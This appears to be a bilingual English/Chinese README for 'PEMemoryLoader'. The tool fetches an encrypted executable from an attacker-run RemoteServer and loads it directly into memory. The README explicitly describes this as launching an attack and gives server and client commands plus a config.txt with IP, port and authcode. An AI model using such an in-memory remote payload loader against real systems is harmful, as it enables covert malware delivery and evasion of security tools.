# PEMemoryLoader

Load static-compiled PE from remote server.

## Principle Introduction

To launch an attack, you should run the RemoteServer first. The RemoteServer is used to provide Encrypted PE after requested (Of course client need to pass authorization before downloading the PE).

Before run the PELoader,You should filling the server's information in config.txt (IP 、port、auth-password).

在开始实施攻击前，你需要先运行RemoteServer。这个服务器用来向客户端PELoader提供被加密的PE文件，PELoader想要获取到这个PE文件是需要匹配authcode进行鉴权的。

做好RemoteServer的准备工作后，可以在PELoader所在的目录下创建config.txt并填入RemoteServer的IP、端口、密码等信息。之后运行PELoader即可。

## Compile

Compile the project with visual studio.

使用vs进行编译即可。

## Usage

### server

```shell
.\RemoteServer.exe [port] [PEPath] [authcode]
```

### client

编辑config.txt

```text
ip = 192.168.1.123
port = 37261
authcode = 654123
```

之后运行PELoader

```shell
.\PELoader.exe
```


